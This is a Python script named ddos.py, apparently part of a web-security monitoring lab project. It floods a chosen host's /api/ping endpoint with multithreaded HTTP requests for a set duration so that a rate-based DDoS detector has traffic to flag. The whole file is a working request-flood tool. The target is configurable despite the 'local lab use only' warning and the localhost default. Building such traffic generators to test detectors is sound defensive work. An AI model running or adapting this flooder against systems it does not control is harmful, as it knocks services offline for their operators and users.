"""
ddos.py — DDoS / Request Flood Attack
Web Security Monitoring Project

Floods the target site's /api/ping endpoint with concurrent requests
for a set duration, simulating a volumetric DDoS attack. Generates the
log pattern (extreme requests/sec from one IP) that the protector
tool's rate-based DDoS detector is built to catch.

LOCAL LAB USE ONLY. Only run this against a target you control.
"""

import argparse
import threading
import time
import requests


def ddos(target_url, duration, workers):
    stop_time = time.time() + duration
    counter = {"sent": 0, "errors": 0}
    lock = threading.Lock()

    def worker():
        session = requests.Session()
        while time.time() < stop_time:
            try:
                session.get(f"{target_url}/api/ping", timeout=3)
                with lock:
                    counter["sent"] += 1
            except requests.exceptions.RequestException:
                with lock:
                    counter["errors"] += 1

    print(f"[*] Target:    {target_url}/api/ping")
    print(f"[*] Duration:  {duration}s")
    print(f"[*] Workers:   {workers}")
    print("[*] Flooding... (Ctrl+C to stop early)\n")

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(workers)]
    for t in threads:
        t.start()

    try:
        while time.time() < stop_time:
            time.sleep(1)
            elapsed = duration - max(0, int(stop_time - time.time()))
            print(f"[{elapsed}s] requests sent: {counter['sent']}  errors: {counter['errors']}")
    except KeyboardInterrupt:
        print("\n[!] Stopped early by user.")

    for t in threads:
        t.join(timeout=1)

    print(f"\n[+] Done. Total requests sent: {counter['sent']}  errors: {counter['errors']}")
    print(f"[+] Avg rate: {counter['sent'] / duration:.1f} req/sec")


def main():
    parser = argparse.ArgumentParser(description="Flood the lab /api/ping endpoint")
    parser.add_argument("--target", default="127.0.0.1", help="Target IP or hostname (no http://)")
    parser.add_argument("--port", default="5000", help="Target port (ignored if --target already has one)")
    parser.add_argument("-t", "--duration", type=int, default=15, help="Flood duration in seconds")
    parser.add_argument("-w", "--workers", type=int, default=20, help="Number of concurrent worker threads")
    args = parser.parse_args()

    target_url = f"http://{args.target}" if ":" in args.target else f"http://{args.target}:{args.port}"
    ddos(target_url, args.duration, args.workers)


if __name__ == "__main__":
    main()
    
